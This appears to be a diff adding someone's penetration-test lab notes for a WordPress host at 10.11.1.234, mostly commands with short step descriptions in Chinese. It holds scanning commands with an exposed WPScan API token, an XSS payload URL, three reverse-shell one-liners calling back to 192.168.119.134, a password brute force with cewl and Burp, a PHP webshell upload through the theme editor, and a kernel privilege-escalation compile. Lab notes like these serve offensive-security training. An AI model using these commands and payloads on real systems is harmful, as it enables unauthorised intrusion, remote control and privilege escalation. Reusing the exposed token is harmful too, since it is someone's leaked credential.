@@ -1,0 +1,34 @@
+nmap -sV -sC -Pn 10.11.1.234 > nmap.txt
+nmap -p- 10.11.1.234 > nmapall.txt
+gobuster dir  -u http://10.11.1.234/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,cgi > gobuster.txt
+wpscan --url http://10.11.1.234/ --enumerate vp --api-token yebWdQNmyXU7oApKQatIaLPe5NL0EkYTjuSunpp5DIU
+
+
+
+gobuster dir -u http://10.11.1.234/cgi-bin/sdfdsf  -w /usr/share/dirb/wordlists/vulns/cgis.txt > cgi.txt
+gobuster dir  -u http://10.11.1.234/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,cgi  > gobuster.txt
+
+
+http://10.11.1.234/wp-includes/js/swfupload/swfupload.swf?buttonText=test%3Cimg%20src=%27http://demo.swfupload.org/v220/images/logo.gif%27%3E
+http://10.11.1.234/wp-includes/js/swfupload/swfupload.swf?buttonText=test<img src='http://demo.swfupload.org/v220/images/logo.gif'>
+
+bash -i >& /dev/tcp/192.168.119.134/443 0>&1
+sh -i >& /dev/udp/192.168.119.134/443 0>&1
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.134 443 >/tmp/f
+
+
+1.nmap掃描後發現有wordpress服務,使用wp-scan掃描,沒發現漏洞利用
+2.gobuster掃描發現有wp-admin頁面可以登入,可以嘗試admin等其他帳號，可以驗證出有admin用戶
+3.使用cewl將首頁字詞存成密碼檔案,使用burp暴力破解
+cewl http://10.11.1.234 > passlist
+4.成功取得princess是密碼
+5.到Theme主題設定,上傳themes使用exploit.php(參考10.11.1.35)
+https://www.hacknos.com/wordpress-shell-upload/
+6.訪問當前年份/日期可以查看到上傳的檔案
+http://10.11.1.234/wp-content/uploads/2021/04/exploit.php
+7.訪問webshell後使用Netcat OpenBsd 取得reverse shell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.134 443 >/tmp/f
+8.取得shell後使用LinEnum.sh查看到內核版本號,使用漏洞題全
+https://www.exploit-db.com/exploits/14814
+Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege Escalation
+gcc -m32 -Wl,--hash-style=both 40839.c -o linux-sendpage
